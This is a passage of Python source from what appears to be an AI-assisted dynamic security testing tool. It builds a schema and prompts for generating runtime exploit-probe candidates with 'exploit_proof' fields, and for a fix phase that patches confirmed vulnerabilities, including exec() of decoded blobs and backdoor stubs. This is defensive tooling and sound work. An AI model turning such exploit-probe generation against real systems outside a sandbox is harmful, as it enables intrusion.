                                "crypto_weakness",
                                "prompt_injection",
                                "open_redirect",
                                "race_condition",
                            ],
                        },
                        "rationale": {"type": "string", "maxLength": 500},
                        "test_inputs": {
                            "type": "array",
                            "maxItems": 3,
                            "items": {
                                "type": "object",
                                "additionalProperties": False,
                                "required": [
                                    "args_json",
                                    "kwargs_json",
                                    "expected_observable",
                                    "exploit_proof_if_observed",
                                ],
                                "properties": {
                                    "args_json": {
                                        "type": "string",
                                        "maxLength": 1000,
                                    },
                                    "kwargs_json": {
                                        "type": "string",
                                        "maxLength": 1000,
                                    },
                                    "expected_observable": {
                                        "type": "string",
                                        "maxLength": 500,
                                    },
                                    "exploit_proof_if_observed": {
                                        "type": "string",
                                        "maxLength": 500,
                                    },
                                },
                            },
                        },
                    },
                },
            },
        },
    }


def build_phase_b_runtime_probe_prompt(
    file_text: str,
    l1_output: dict,
    journal_summary: Any,
) -> str:
    """Build the Phase B+ runtime-probe candidate-generation prompt.

    Same input shape as ``build_phase_b_prompt`` so the orchestrator can
    use the same inference fn. Output is structured per
    :func:`phase_b_runtime_probe_schema`.
    """
    from dast.runtime_probe import MAX_CANDIDATES, MAX_INPUTS_PER_CANDIDATE  # noqa: PLC0415

    # str.replace, NOT .format — the prompt body contains literal {}
    # (JSON examples, dict syntax in code) that .format() mis-interprets
    # as positional placeholders.
    body = (
        _PHASE_B_RUNTIME_PROBE_BODY
        .replace("{MAX_CANDIDATES}", str(MAX_CANDIDATES))
        .replace("{MAX_INPUTS_PER_CANDIDATE}", str(MAX_INPUTS_PER_CANDIDATE))
    )
    payload = _format_inputs(file_text, l1_output, journal_summary)
    return body + payload


# ── Phase C — Fix-and-verify (v1.2) ────────────────────────────────────────


_PHASE_C_FIX_BODY = """You are a senior security engineer. Below is a source file
that DAST has confirmed contains real, runtime-exploitable vulnerabilities.
Produce a PATCHED version of the file that NEUTRALIZES every confirmed
vulnerability while preserving the file's legitimate behavior.

REQUIREMENTS:
1. Apply minimal, surgical changes — do not refactor unrelated code.
2. For each confirmed finding, eliminate the exploit path. Acceptable
   strategies (in order of preference):
   a. Replace the unsafe call with a safe equivalent (e.g., remove
      exec() of decoded blobs; use ast.literal_eval for trusted data;
      use shlex.quote / parameterized queries).
   b. Add validation/sanitization at the input boundary if the unsafe
      operation cannot be removed.
   c. Remove the entire unsafe code path if it serves no legitimate
      purpose (the file is a backdoor / malware stub).
3. The patched file must be syntactically valid in the original
   language. If you remove a function body, replace it with a clear
   stub (e.g., 'pass' for Python, 'return null;' for JS).
4. Do NOT add new dependencies, new functionality, new comments
   unrelated to the security fix, or library imports the original
   file did not already have unless strictly required for the fix.
5. Output the COMPLETE patched file in 'patched_source' — full
   text, ready to write to disk. Do not omit any unchanged sections.

The patched file will be re-tested in the same sandbox environment
that confirmed the original exploits. Your goal: every confirmed
hypothesis should fail to fire against the patched file.

OUTPUT JSON conforming to the provided schema (one object).
"""


def phase_c_fix_schema() -> dict[str, Any]:
    return {
        "type": "object",
        "additionalProperties": False,
        "properties": {
            "patched_source": {
                "type": "string",
                "description": (
                    "Complete patched file content. Must be the FULL "
                    "source of the file (not a diff)."
                ),
            },
            "fix_summary": {
                "type": "string",
                "description": (
                    "1-3 sentence summary of what was changed and why."
                ),
            },
            "per_finding_fixes": {
                "type": "array",
                "description": (
                    "One entry per confirmed finding; describe the "
                    "specific change applied."
                ),
                "items": {
                    "type": "object",
                    "additionalProperties": False,
                    "properties": {
                        "finding_ref": {"type": "string"},
                        "change_description": {"type": "string"},
                    },
                    "required": ["finding_ref", "change_description"],
                },
            },
        },
        "required": ["patched_source", "fix_summary"],
    }


def build_phase_c_fix_prompt(
    file_name: str,
    original_source: str,
    confirmed_findings: list[dict],
) -> str:
    findings_lines = []
    for i, f in enumerate(confirmed_findings):
        findings_lines.append(
            f"\n--- Finding {i+1} (finding_ref={f.get('finding_ref', '?')}) ---\n"
            f"  type:        {f.get('type', 'unknown')}\n"
            f"  severity:    {f.get('severity', 'unknown')}\n"
            f"  description: {(f.get('description') or f.get('claim') or '').strip()[:600]}\n"
            f"  L1_fix:      {(f.get('fix') or '(none provided)').strip()[:400]}"
        )
    findings_block = "".join(findings_lines)
    payload = (
        f"\n\nFILENAME: {file_name}\n\n"
        f"=== Original source ===\n{original_source}\n\n"
        f"=== Confirmed vulnerabilities ===\n{findings_block}\n\n"
        f"Output JSON conforming to the provided schema."
    )
    return _PHASE_C_FIX_BODY + payload

